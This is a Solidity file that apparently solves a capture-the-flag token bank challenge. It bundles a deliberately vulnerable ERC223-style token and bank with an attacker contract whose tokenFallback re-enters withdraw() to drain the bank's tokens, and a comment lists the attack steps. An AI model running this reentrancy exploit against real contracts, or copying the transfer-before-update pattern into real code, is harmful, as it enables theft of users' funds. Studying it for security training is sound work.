/**
 * Steps for attack:
 * 1. Deploy the TokenBankAttacker contract
 * 2. Deploy the TokenBankChallenge contract and pass in the address of the TokenBankAttacker contract as the player address
 * 3. Call TokenBankAttacker.executeAttack(), which calls tokenBank.withdraw to withdraw the half of tokens initially assigned to the player
 * 4. tokenBank.withdraw() will then call token.transfer to transfer all funds *before* it updates the balanceOf[msg.sender]
 * 5. token.transfer will then call .tokenFallback if funds are being transferred to a contract, which they are
 * 6. TokenBankAttacker.tokenFallback will then call tokenBank.withdraw once again to withdraw the other half of the tokens, which will succeed because the balance withdrawable from the bank for us has not yet updated, thus emptying the bank.
 */

// This only work on <0.8 where overflow/underflow protection isn't enabled
// since otherwise the last balanceOf[msg.sender] -= amount action will underflow and revert in the withdraw() function
pragma solidity 0.7.0;

interface ITokenReceiver {
    function tokenFallback(
        address from,
        uint256 value,
        bytes memory data
    ) external;
}

contract SimpleERC223Token {
    // Track how many tokens are owned by each address.
    mapping(address => uint256) public balanceOf;

    string public name = "Simple ERC223 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;

    uint256 public totalSupply = 1000000 * (uint256(10) ** decimals);

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor() {
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    function isContract(address _addr) private view returns (bool is_contract) {
        uint length;
        assembly {
            //retrieve the size of the code on target address, this needs assembly
            length := extcodesize(_addr)
        }
        return length > 0;
    }

    function transfer(address to, uint256 value) public returns (bool success) {
        bytes memory empty;
        return transfer(to, value, empty);
    }

    function transfer(
        address to,
        uint256 value,
        bytes memory data
    ) public returns (bool) {
        require(balanceOf[msg.sender] >= value);

        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        emit Transfer(msg.sender, to, value);

        if (isContract(to)) {
            // right, if it's a contract it calls the fallback great
            ITokenReceiver(to).tokenFallback(msg.sender, value, data);
        }
        return true;
    }

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(
        address spender,
        uint256 value
    ) public returns (bool success) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) public returns (bool success) {
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }
}

contract TokenBankChallenge {
    SimpleERC223Token public token;
    mapping(address => uint256) public balanceOf;

    constructor(address player) {
        token = new SimpleERC223Token();

        // Divide up the 1,000,000 tokens, which are all initially assigned to
        // the token contract's creator (this contract).
        balanceOf[msg.sender] = 500000 * 10 ** 18; // half for me
        balanceOf[player] = 500000 * 10 ** 18; // half for you
    }

    function isComplete() public view returns (bool) {
        return token.balanceOf(address(this)) == 0;
    }

    function tokenFallback(address from, uint256 value, bytes memory) public {
        require(msg.sender == address(token));
        require(balanceOf[from] + value >= balanceOf[from]); // overflow check

        balanceOf[from] += value; // so yeah this is the key this just keeps going up
    }

    function withdraw(uint256 amount) public {
        require(balanceOf[msg.sender] >= amount);

        require(token.transfer(msg.sender, amount)); // this is the key fallback then
        balanceOf[msg.sender] -= amount;
    }
}

contract TokenBankAttacker {
    bool reentrancyExecuted;
    TokenBankChallenge tokenBank;
    SimpleERC223Token token;

    function setTokenBankContract(address _tokenBank) public {
        tokenBank = TokenBankChallenge(_tokenBank);
        token = tokenBank.token();
    }

    function executeAttack() public {
        tokenBank.withdraw(500000 * 10 ** 18);
    }

    function tokenFallback(address from, uint256 value, bytes memory) public {
        uint256 remainingBalance = token.balanceOf(address(tokenBank));
        if (remainingBalance > 0) {
            tokenBank.withdraw(remainingBalance);
        }
    }
}
